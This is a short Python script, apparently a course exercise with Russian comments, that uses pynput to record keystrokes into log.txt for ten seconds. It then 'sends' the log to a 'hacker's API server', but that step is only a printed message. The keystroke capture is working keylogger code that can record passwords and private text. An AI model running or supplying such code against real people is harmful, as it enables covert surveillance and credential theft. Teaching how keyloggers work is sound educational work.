import pynput.keyboard
import requests # Для имитации отправки данных

def on_press(key):
    try:
        current_key = str(key).replace("'", "")
    except Exception:
        current_key = " [Special Key] "
    
    with open("log.txt", "a") as f:
        f.write(current_key + "\n")

# Имитация функции отправки данных на сервер (Task из методички)
def send_logs():
    print("Sending log.txt to hacker's API server...")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    print("Start key logging...")
    # Таймаут 10 секунд для быстрой демонстрации
    listener.join(timeout=10)

send_logs()
print("End key logging...")
